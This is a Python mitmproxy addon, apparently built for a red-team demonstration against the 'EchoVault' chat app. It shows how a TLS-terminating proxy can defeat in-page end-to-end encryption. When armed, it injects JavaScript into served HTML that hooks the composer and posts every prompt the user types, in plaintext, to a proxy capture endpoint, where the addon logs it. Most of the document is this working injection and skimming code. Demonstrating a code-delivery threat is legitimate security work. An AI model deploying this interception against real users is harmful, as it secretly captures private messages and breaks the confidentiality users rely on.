# ── EchoVault red-team addon: toggleable client-code-delivery tamper ─────────
#
# WHAT THIS DEMONSTRATES
#   The browser loads its chat page (/client/app/page.tsx, compiled + served by
#   Next.js) THROUGH this TLS-terminating proxy. Because the proxy controls the
#   code-delivery channel, it can rewrite the page on the way to the browser and
#   graft in a small capture script. That script hooks the composer so every
#   prompt the user submits is ALSO posted straight to the proxy (plaintext),
#   in addition to going out over the normal EchoVault echo-server channel.
#
#   This is the "malicious/compromised code-delivery" exhibit: even a correct
#   in-page E2E implementation is defeated if the ATTACKER SHIPS THE PAGE, since
#   the attacker can add a second exfil path before the prompt is ever sealed.
#
# ARMED vs DISARMED — a single boolean option, `tamper_active`
#   * DISARMED (default): the addon is COMPLETELY INERT. It intercepts nothing
#     and rewrites nothing. Every request and response passes through exactly as
#     Next.js / FastAPI produced it — the page the browser receives is
#     byte-for-byte identical to the untouched build. No injected script, no
#     magic endpoints, no trace.
#   * ARMED: the response hook performs the code swap (injects the capture
#     script into served HTML), and the request hook intercepts the capture
#     endpoint (/__capture_plaintext) to log the exfiltrated prompt.
#
#   Flipping the toggle "fires the code swap" on the NEXT page load. Arm, then
#   reload the browser to get the tampered page; disarm, then reload to get the
#   clean page back.
#
# HOW TO TOGGLE IT
#   * mitmweb (this deployment): open the mitmweb UI (http://<box-ip>:8081), go
#     to the OPTIONS tab, and flip the boolean option `tamper_active`. That is
#     the web-GUI control. NOTE: mitmweb has NO command prompt, so `:set ...`
#     and `:tamper.start` do NOT work there — use the Options tab.
#   * mitmproxy (terminal TUI): `:set tamper_active=true`, or the commands
#     `:tamper.start` / `:tamper.stop` / `:tamper.toggle` / `:tamper.status`.
#     (These commands exist for the TUI / scripting; they are NOT reachable from
#     mitmweb.)

from mitmproxy import command, ctx, http

CAPTURE_PATH = "/__capture_plaintext"


# ── the capture script — only injected while the inject is ARMED ──────────────
# Because the proxy only grafts this in when armed (see response()), the script
# itself is unconditional: it just captures. It posts every prompt straight to
# the proxy IN ADDITION to the app's own encrypted echo-server send (we never
# call preventDefault / stopPropagation, so the real channel is unaffected). It
# hooks BOTH the form submit (Send button) and Enter-in-textarea (which the app
# handles without firing a form submit), so no matter how the user sends we
# see it.
INJECTED_SCRIPT = """
<script>
(function () {
  if (window.__evTamperInstalled) return;
  window.__evTamperInstalled = true;

  var CAPTURE_URL = "__CAPTURE_PATH__";

  function exfil(text) {
    if (!text) return;
    try {
      if (navigator.sendBeacon(CAPTURE_URL, new Blob([text], { type: "text/plain" }))) return;
    } catch (e) {}
    fetch(CAPTURE_URL, { method: "POST", body: text, keepalive: true }).catch(function () {});
  }

  function promptFrom(scope) {
    var ta = (scope && scope.querySelector) ? scope.querySelector("textarea") : null;
    if (!ta) ta = document.querySelector("textarea");
    return (ta && ta.value) ? ta.value.trim() : "";
  }

  // Capture phase so we read the textarea value BEFORE the app clears it.
  document.addEventListener("submit", function (e) {
    exfil(promptFrom(e.target));
  }, true);

  document.addEventListener("keydown", function (e) {
    if (e.key === "Enter" && !e.shiftKey &&
        e.target && e.target.tagName === "TEXTAREA") {
      exfil(promptFrom(e.target.form || document));
    }
  }, true);
})();
</script>
""".replace("__CAPTURE_PATH__", CAPTURE_PATH)


class TamperClientCode:
    # ── option registration: this is the toggle shown in the mitmweb Options UI
    def load(self, loader):
        loader.add_option(
            name="tamper_active",
            typespec=bool,
            default=False,
            help="Arm the EchoVault client-code tamper inject (browser exfil of prompts to the proxy).",
        )

    def configure(self, updated):
        if "tamper_active" in updated:
            state = "ARMED" if ctx.options.tamper_active else "disarmed"
            ctx.log.warn(f"[tamper] inject {state} (tamper_active={ctx.options.tamper_active})")

    # ── commands: mitmproxy TUI / scripting only (NOT reachable from mitmweb) ──
    @command.command("tamper.start")
    def start(self) -> None:
        """Arm the client-code tamper inject."""
        ctx.options.update(tamper_active=True)

    @command.command("tamper.stop")
    def stop(self) -> None:
        """Disarm the client-code tamper inject."""
        ctx.options.update(tamper_active=False)

    @command.command("tamper.toggle")
    def toggle(self) -> None:
        """Flip the client-code tamper inject on/off."""
        ctx.options.update(tamper_active=not ctx.options.tamper_active)

    @command.command("tamper.status")
    def status(self) -> str:
        """Report whether the inject is armed."""
        return "armed" if ctx.options.tamper_active else "disarmed"

    # ── request side: capture endpoint — ONLY while armed ─────────────────────
    def request(self, flow: http.HTTPFlow) -> None:
        # Disarmed → intercept NOTHING. The request passes straight through to
        # the backend, exactly as if this addon were not loaded.
        if not ctx.options.tamper_active:
            return

        if flow.request.path.split("?", 1)[0] == CAPTURE_PATH:
            plaintext = flow.request.get_text(strict=False)
            ctx.log.warn("CLIENT CODE CAPTURED PLAINTEXT BEFORE HPKE")
            ctx.log.warn(f"captured plaintext: {plaintext}")
            flow.response = http.Response.make(204, b"")

    # ── response side: graft the capture script into served HTML — ONLY armed ─
    def response(self, flow: http.HTTPFlow) -> None:
        # Disarmed → leave the served page EXACTLY as the backend produced it.
        # No swap, no injection, no trace: byte-for-byte the untouched build.
        if not ctx.options.tamper_active:
            return

        # Don't inject into our own capture endpoint's response.
        if flow.request.path.split("?", 1)[0] == CAPTURE_PATH:
            return

        content_type = flow.response.headers.get("content-type", "")
        if "text/html" not in content_type:
            return

        html = flow.response.get_text(strict=False)
        if not html or "</body>" not in html:
            return

        flow.response.set_text(html.replace("</body>", INJECTED_SCRIPT + "</body>"))
        ctx.log.warn("[tamper] ARMED — injected capture script into served HTML page")


addons = [TamperClientCode()]
